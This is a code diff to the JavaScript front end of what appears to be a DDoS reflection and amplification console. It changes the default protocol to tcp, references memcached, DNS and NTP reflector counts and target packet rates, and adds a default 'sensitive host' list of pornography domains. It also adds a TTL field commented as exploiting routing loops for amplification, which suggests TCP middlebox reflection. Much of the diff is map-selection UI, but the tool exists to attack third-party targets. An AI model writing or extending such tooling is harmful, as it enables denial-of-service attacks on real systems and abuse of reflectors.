@@ -11,7 +11,7 @@ let isLatencySamplePending = false;
 let baselineLatency = null;
 let baselineSamples = [];
 let attackStartTimeForLatency = null;
-let currentProto = "memcached";
+let currentProto = "tcp";
 let serverGlobe = null;
 let lastGeoPoints = [];
 let lastGeoAreas = [];
@@ -22,8 +22,9 @@ let isGeoMapLoading = false;
 let serverResourceItems = [];
 let serverUnresolvedItems = [];
 let serverUnresolvedCount = 0;
-let selectedAreaCode = "";
+let selectedAreaCodes = [];
 let selectedIp = "";
+let selectedIpSet = new Set();
 let serverListFilterMode = "all";
 let currentServerFile = null;
 let currentServerSource = "";
@@ -1696,6 +1697,7 @@ document.addEventListener("DOMContentLoaded", () => {
     FileSystemUi.init();
     toggleMultiProtocol();
     initConsoleFormPersistence();
+    initSensitiveHostManager();
     initLatencyFormPersistence();
     loadAllServerCounts();
     loadServerGeoMap();
@@ -3088,8 +3090,9 @@ function renderGeoUnresolved(items) {
 }
 
 function resetServerSelectionState() {
-    selectedAreaCode = "";
+    selectedAreaCodes = [];
     selectedIp = "";
+    selectedIpSet = new Set();
     serverListFilterMode = "all";
 }
 
@@ -3157,7 +3160,12 @@ function getAreaDisplayName(area) {
 }
 
 function getSelectedArea() {
-    return lastGeoAreas.find((area) => String(area.area_code || "") === selectedAreaCode) || null;
+    const code = selectedAreaCodes.length > 0 ? selectedAreaCodes[0] : "";
+    return lastGeoAreas.find((area) => String(area.area_code || "") === code) || null;
+}
+
+function getAllSelectedAreas() {
+    return lastGeoAreas.filter((area) => selectedAreaCodes.includes(String(area.area_code || "")));
 }
 
 function getAreaForItem(item) {
@@ -3166,13 +3174,15 @@ function getAreaForItem(item) {
 }
 
 function getVisibleServerResourceItems() {
-    if (serverListFilterMode === "area" && selectedAreaCode) {
-        const area = getSelectedArea();
-        if (!area) return [];
-        return serverResourceItems.filter((item) => area.ips.includes(item.ip));
+    if (selectedIpSet.size > 0) {
+        return serverResourceItems;
     }
-    if (serverListFilterMode === "ip" && selectedIp) {
-        return serverResourceItems.filter((item) => item.ip === selectedIp);
+    if (selectedAreaCodes.length > 0) {
+        const selectedAreas = getAllSelectedAreas();
+        if (!selectedAreas.length) return [];
+        const ipSet = new Set();
+        selectedAreas.forEach((area) => (area.ips || []).forEach((ip) => ipSet.add(ip)));
+        return serverResourceItems.filter((item) => ipSet.has(item.ip));
     }
     return serverResourceItems;
 }
@@ -3186,10 +3196,21 @@ function clearServerSelection() {
 function selectServerArea(areaCode) {
     const area = lastGeoAreas.find((item) => String(item.area_code || "") === String(areaCode || ""));
     if (!area) return;
-    selectedAreaCode = String(area.area_code || "");
-    selectedIp = "";
-    serverListFilterMode = "area";
-    focusServerArea(area);
+    const code = String(area.area_code || "");
+    const idx = selectedAreaCodes.indexOf(code);
+    if (idx >= 0) {
+        selectedAreaCodes.splice(idx, 1);
+    } else {
+        selectedAreaCodes.push(code);
+    }
+    if (selectedAreaCodes.length > 0) {
+        selectedIpSet = new Set();
+        selectedIp = "";
+        serverListFilterMode = "area";
+        focusServerArea(area);
+    } else {
+        serverListFilterMode = "all";
+    }
     renderServerWorkspace();
     updateWorkflowIndicators();
 }
@@ -3197,10 +3218,23 @@ function selectServerArea(areaCode) {
 function selectServerIp(ip) {
     const item = serverResourceItems.find((resource) => resource.ip === ip);
     if (!item) return;
-    selectedIp = ip;
+    const wasSelected = selectedIpSet.has(ip);
+    if (wasSelected) {
+        selectedIpSet.delete(ip);
+        if (selectedIp === ip) selectedIp = selectedIpSet.size > 0 ? [...selectedIpSet][selectedIpSet.size - 1] : "";
+    } else {
+        selectedIpSet.add(ip);
+        selectedIp = ip;
+    }
+    if (selectedIpSet.size > 0 && selectedAreaCodes.length > 0) {
+        selectedAreaCodes = [];
+        serverListFilterMode = "all";
+    } else if (selectedIpSet.size > 0) {
+        serverListFilterMode = "ip";
+    } else {
+        serverListFilterMode = "all";
+    }
     const area = getAreaForItem(item);
-    selectedAreaCode = area?.area_code || "";
-    serverListFilterMode = "ip";
     if (area) focusServerArea(area, item);
     renderServerWorkspace();
     updateWorkflowIndicators();
@@ -3236,12 +3270,12 @@ function renderServerFilterSummary() {
     const count = document.getElementById("serverVisibleCount");
     const clearBtn = document.getElementById("clearServerSelectionBtn");
     const visibleItems = getVisibleServerResourceItems();
-    const area = getSelectedArea();
+    const selectedAreas = getAllSelectedAreas();
     let filterTitle = "全部资源";
-    if (serverListFilterMode === "area" && area) {
-        filterTitle = `区域筛选 · ${getAreaDisplayName(area)}`;
-    } else if (serverListFilterMode === "ip" && selectedIp) {
-        filterTitle = `IP 定位 · ${selectedIp}`;
+    if (selectedAreaCodes.length > 0) {
+        filterTitle = `区域筛选 (${selectedAreaCodes.length}个区域)`;
+    } else if (selectedIpSet.size > 0) {
+        filterTitle = `已选 IP (${selectedIpSet.size}个)`;
     }
     if (title) title.textContent = filterTitle;
     if (count) count.textContent = String(visibleItems.length);
@@ -3251,51 +3285,44 @@ function renderServerFilterSummary() {
 function renderServerSelectionDetail() {
     const container = document.getElementById("serverSelectionDetail");
     if (!container) return;
-    if (serverListFilterMode === "all") {
+    if (selectedAreaCodes.length === 0 && selectedIpSet.size === 0) {
         container.innerHTML = `
             <div class="server-detail-grid">
                 <div><span>当前协议</span><strong>${escapeHtml(getMethodText(currentProto))}</strong></div>
                 <div><span>已选源文件</span><strong>${escapeHtml(getSelectedServerSourceSummary())}</strong></div>
                 <div><span>已选数量</span><strong>${escapeHtml(String(getSelectedServerSources().length))}</strong></div>
-                <div><span>交互提示</span><strong>点击地图区域或 IP 反向定位</strong></div>
+                <div><span>交互提示</span><strong>点击地图区域/IP 可多选；再次点击可取消</strong></div>
             </div>
         `;
         return;
     }
-    if (serverListFilterMode === "all") {
-        container.innerHTML = `<div class="info-text">点击地图区域可筛选资源，点击 IP 列表可反向定位所在区域。</div>`;
-        return;
-    }
-    if (serverListFilterMode === "area") {
-        const area = getSelectedArea();
-        if (!area) {
-            container.innerHTML = `<div class="info-text">当前区域已不可用，请重新选择。</div>`;
-            return;
-        }
+    if (selectedAreaCodes.length > 0) {
+        const selectedAreas = getAllSelectedAreas();
+        const totalIps = selectedAreas.reduce((sum, a) => sum + (a.ips || []).length, 0);
         container.innerHTML = `
             <div class="server-detail-grid">
-                <div><span>当前区域</span><strong>${escapeHtml(getAreaDisplayName(area))}</strong></div>
-                <div><span>资源条目</span><strong>${escapeHtml(String(area.resource_count || 0))}</strong></div>
-                <div><span>IP 数量</span><strong>${escapeHtml(String((area.ips || []).length))}</strong></div>
-                <div><span>协议</span><strong>${escapeHtml(getMethodText(area.protocol))}</strong></div>
+                <div><span>选中区域</span><strong>${escapeHtml(String(selectedAreaCodes.length))} 个</strong></div>
+                <div><span>区域内 IP 总数</span><strong>${escapeHtml(String(totalIps))}</strong></div>
+                <div><span>区域名称</span><strong style="font-size:11px">${escapeHtml(selectedAreas.map(a => getAreaDisplayName(a)).join("、"))}</strong></div>
+                <div><span>操作提示</span><strong>再次点击区域可取消选中</strong></div>
             </div>
         `;
         return;
     }
-    const selectedItem = serverResourceItems.find((item) => item.ip === selectedIp);
-    const area = selectedItem ? getAreaForItem(selectedItem) : null;
-    if (!selectedItem) {
-        container.innerHTML = `<div class="info-text">当前 IP 已不可用，请重新选择。</div>`;
+    if (selectedIpSet.size > 0) {
+        const ips = [...selectedIpSet];
+        const item = serverResourceItems.find((it) => ips.includes(it.ip));
+        const area = item ? getAreaForItem(item) : null;
+        container.innerHTML = `
+            <div class="server-detail-grid">
+                <div><span>已选 IP</span><strong>${escapeHtml(String(selectedIpSet.size))} 个</strong></div>
+                <div><span>最近选中</span><strong>${escapeHtml(selectedIp || "-")}</strong></div>
+                <div><span>最近区域</span><strong>${escapeHtml(area ? getAreaDisplayName(area) : "未定位")}</strong></div>
+                <div><span>操作提示</span><strong>IP 仅高亮不筛选列表，点击可取消</strong></div>
+            </div>
+        `;
         return;
     }
-    container.innerHTML = `
-        <div class="server-detail-grid">
-            <div><span>资源条目</span><strong>${escapeHtml(selectedItem.entry)}</strong></div>
-            <div><span>IP</span><strong>${escapeHtml(selectedItem.ip)}</strong></div>
-            <div><span>地区</span><strong>${escapeHtml(area ? getAreaDisplayName(area) : "未定位")}</strong></div>
-            <div><span>城市</span><strong>${escapeHtml(selectedItem.city || "-")}</strong></div>
-        </div>
-    `;
 }
 
 function renderServerResourceList() {
@@ -3303,15 +3330,20 @@ function renderServerResourceList() {
     if (!container) return;
     const visibleItems = getVisibleServerResourceItems();
     if (!visibleItems.length) {
-        container.innerHTML = `<div class="info-text">当前筛选条件下没有可展示的资源。</div>`;
+        let msg = "当前筛选条件下没有可展示的资源。";
+        if (selectedAreaCodes.length > 0) {
+            const areaNames = getAllSelectedAreas().map((a) => getAreaDisplayName(a));
+            msg = `选中区域（${areaNames.join("、")}）内暂无可展示的资源。`;
+        }
+        container.innerHTML = `<div class="info-text">${escapeHtml(msg)}</div>`;
         return;
     }
     container.innerHTML = visibleItems.map((item) => {
         const area = getAreaForItem(item);
-        const isActive = selectedIp === item.ip && serverListFilterMode === "ip";
-        const inSelectedArea = selectedAreaCode && area?.area_code === selectedAreaCode;
+        const isActive = selectedIpSet.has(item.ip);
+        const inSelectedArea = selectedAreaCodes.length > 0 && area && selectedAreaCodes.includes(String(area.area_code || ""));
         return `
-            <button type="button" class="server-resource-item ${isActive ? "active" : ""}" data-server-ip="${escapeHtml(item.ip)}">
+            <button type="button" class="server-resource-item ${isActive ? "active" : ""} ${inSelectedArea ? "in-area" : ""}" data-server-ip="${escapeHtml(item.ip)}">
                 <span class="server-resource-main">
                     <strong>${escapeHtml(item.entry)}</strong>
                     <span>${escapeHtml(item.ip)}</span>
@@ -3320,7 +3352,7 @@ function renderServerResourceList() {
                 <span class="server-resource-meta">
                     <span>${escapeHtml(area ? getAreaDisplayName(area) : "未定位")}</span>
                     <span>${escapeHtml(item.city || item.country || "-")}</span>
-                    ${inSelectedArea ? `<em>当前区域</em>` : ""}
+                    ${inSelectedArea ? `<em>区域内</em>` : ""}
                 </span>
             </button>
         `;
@@ -3576,10 +3608,19 @@ function initServerGlobe() {
         .globeImageUrl("//unpkg.com/three-globe/example/img/earth-blue-marble.jpg")
         .bumpImageUrl("//unpkg.com/three-globe/example/img/earth-topology.png")
         .polygonsData([])
-        .polygonAltitude(() => 0.004)
+        .polygonAltitude((feature) => {
+            const area = feature.properties?._resourceArea;
+            return isAreaSelected(area) ? 0.012 : 0.004;
+        })
         .polygonCapColor((feature) => getAreaFillColor(feature.properties?._resourceArea))
-        .polygonSideColor(() => "rgba(64, 231, 255, 0.08)")
-        .polygonStrokeColor(() => "rgba(223, 245, 255, 0.78)")
+        .polygonSideColor((feature) => {
+            const area = feature.properties?._resourceArea;
+            return isAreaSelected(area) ? "rgba(59, 130, 246, 0.45)" : "rgba(64, 231, 255, 0.08)";
+        })
+        .polygonStrokeColor((feature) => {
+            const area = feature.properties?._resourceArea;
+            return isAreaSelected(area) ? "rgba(255, 255, 255, 1)" : "rgba(223, 245, 255, 0.78)";
+        })
         .polygonLabel((feature) => renderAreaTooltip(feature.properties?._resourceArea));
     const controls = serverGlobe.controls();
     if (controls) {
@@ -3626,10 +3667,10 @@ async function loadServerGeoMap() {
         serverResourceItems = buildServerResourceItems(lastGeoPoints);
         serverUnresolvedItems = [];
         serverUnresolvedCount = Number(data.unresolved_count) || 0;
-        if (serverListFilterMode === "area" && !getSelectedArea()) {
+        if (serverListFilterMode === "area" && getAllSelectedAreas().length === 0) {
             resetServerSelectionState();
         }
-        if (serverListFilterMode === "ip" && selectedIp && !serverResourceItems.some((item) => item.ip === selectedIp)) {
+        if (serverListFilterMode === "ip" && selectedIpSet.size > 0 && !serverResourceItems.some((item) => selectedIpSet.has(item.ip))) {
             resetServerSelectionState();
         }
         await ensureServerMapShapes();
@@ -3879,12 +3920,17 @@ function getAreaFillColor(area) {
         ntp: [92, 255, 177]
     }[area?.protocol || currentProto] || [64, 231, 255];
     const selected = isAreaSelected(area);
-    const alpha = selected ? 0.88 : 0.28 + ratio * 0.5;
+    if (selected) {
+        // 选中状态：高饱和度 + 高不透明度 + 暖色调偏移，与未选中形成强对比
+        return `rgba(${Math.min(255, base[0] + 40)}, ${Math.min(255, base[1] + 40)}, ${base[2]}, 0.95)`;
+    }
+    // 未选中：低不透明度，根据资源密度渐变
+    const alpha = 0.15 + ratio * 0.35;
     return `rgba(${base[0]}, ${base[1]}, ${base[2]}, ${alpha.toFixed(2)})`;
 }
 
 function isAreaSelected(area) {
-    return Boolean(area && selectedAreaCode && String(area.area_code || "") === String(selectedAreaCode));
+    return Boolean(area && selectedAreaCodes.length > 0 && selectedAreaCodes.includes(String(area.area_code || "")));
 }
 
 function renderAreaTooltip(area) {
@@ -3952,11 +3998,96 @@ function toggleMultiProtocol() {
     updateWorkflowIndicators();
 }
 
+// === 敏感目标地址管理 ===
+let tcpSensitiveHosts = [];
+const TCP_SENSITIVE_HOSTS_KEY = "tcp_sensitive_hosts";
+const TCP_DEFAULT_SENSITIVE_HOSTS = [
+    "www.youporn.com",
+    "www.roxypalce.com",
+    "www.pornhub.com",
+    "www.xvideos.com",
+];
+
+function loadSensitiveHosts() {
+    try {
+        const saved = localStorage.getItem(TCP_SENSITIVE_HOSTS_KEY);
+        if (saved) {
+            tcpSensitiveHosts = JSON.parse(saved);
+        } else {
+            tcpSensitiveHosts = [...TCP_DEFAULT_SENSITIVE_HOSTS];
+        }
+    } catch {
+        tcpSensitiveHosts = [...TCP_DEFAULT_SENSITIVE_HOSTS];
+    }
+}
+
+function saveSensitiveHosts() {
+    try {
+        localStorage.setItem(TCP_SENSITIVE_HOSTS_KEY, JSON.stringify(tcpSensitiveHosts));
+    } catch {}
+}
+
+function renderSensitiveHostList() {
+    const container = document.getElementById("tcpSensitiveHostList");
+    if (!container) return;
+    if (!tcpSensitiveHosts.length) {
+        container.innerHTML = `<span class="info-text" style="font-size:10px">暂无敏感地址，请添加</span>`;
+        return;
+    }
+    container.innerHTML = tcpSensitiveHosts.map((host) => `
+        <span class="sensitive-host-chip" data-host="${escapeHtml(host)}">
+            ${escapeHtml(host)}
+            <i class="fas fa-times chip-remove" data-remove-host="${escapeHtml(host)}" title="删除"></i>
+        </span>
+    `).join("");
+    container.querySelectorAll("[data-remove-host]").forEach((el) => {
+        el.addEventListener("click", (e) => {
+            e.stopPropagation();
+            const host = el.getAttribute("data-remove-host");
+            tcpSensitiveHosts = tcpSensitiveHosts.filter((h) => h !== host);
+            saveSensitiveHosts();
+            renderSensitiveHostList();
+        });
+    });
+}
+
+function addSensitiveHost() {
+    const input = document.getElementById("tcpSensitiveHostInput");
+    if (!input) return;
+    const host = input.value.trim();
+    if (!host) return;
+    if (tcpSensitiveHosts.includes(host)) {
+        input.value = "";
+        return;
+    }
+    tcpSensitiveHosts.push(host);
+    saveSensitiveHosts();
+    renderSensitiveHostList();
+    input.value = "";
+}
+
+function initSensitiveHostManager() {
+    loadSensitiveHosts();
+    renderSensitiveHostList();
+    document.getElementById("tcpAddSensitiveHostBtn")?.addEventListener("click", addSensitiveHost);
+    document.getElementById("tcpSensitiveHostInput")?.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") {
+            e.preventDefault();
+            addSensitiveHost();
+        }
+    });
+}
+
 function updateMethodSettings() {
     const method = document.getElementById("method")?.value;
     const tcpSection = document.getElementById("tcpPktMethodSection");
+    const tcpTtlSection = document.getElementById("tcpTtlSection");
+    const tcpHostSection = document.getElementById("tcpSensitiveHostSection");
     const sourceRow = document.getElementById("singleProtoSourceRow");
-    if (tcpSection) tcpSection.style.display = (method === "tcp") ? "block" : "none";
+    const showTcp = method === "tcp";
+    if (tcpSection) tcpSection.style.display = showTcp ? "block" : "none";
+    if (tcpTtlSection) tcpTtlSection.style.display = showTcp ? "block" : "none";
+    if (tcpHostSection) tcpHostSection.style.display = showTcp ? "block" : "none";
     if (sourceRow) {
         sourceRow.style.display = method ? "flex" : "none";
     }
@@ -3973,8 +4104,13 @@ function updateProtocolSelection() {
         .map((input) => input.value);
     if (isMultiProtocol) {
         loadReflectorCount(selectedProtocols);
+        const hasTcp = selectedProtocols.includes("tcp");
         const tcpSection = document.getElementById("tcpPktMethodSection");
-        if (tcpSection) tcpSection.style.display = selectedProtocols.includes("tcp") ? "block" : "none";
+        const tcpTtlSection = document.getElementById("tcpTtlSection");
+        const tcpHostSection = document.getElementById("tcpSensitiveHostSection");
+        if (tcpSection) tcpSection.style.display = hasTcp ? "block" : "none";
+        if (tcpTtlSection) tcpTtlSection.style.display = hasTcp ? "block" : "none";
+        if (tcpHostSection) tcpHostSection.style.display = hasTcp ? "block" : "none";
     } else {
         const method = document.getElementById("method")?.value;
         loadReflectorCount(method ? [method] : ["memcached", "dns", "ntp"]);
@@ -4147,6 +4283,17 @@ async function startTest() {
         target_pps: readNumber("target_pps", 5000),
         multi_protocol: isMultiProtocol
     };
+
+    // 读取 TCP TTL（默认 255，论文推荐利用路由环路放大）
+    const tcpAttackTtlInput = document.getElementById("tcpAttackTtl");
+    let ttl = 255;
+    if (tcpAttackTtlInput) {
+        const raw = parseInt(tcpAttackTtlInput.value, 10);
+        if (!isNaN(raw) && raw >= 1 && raw <= 255) {
+            ttl = raw;
+        }
+    }
+    data.ttl = ttl;
 
     if (isMultiProtocol) {
         updateProtocolSelection();
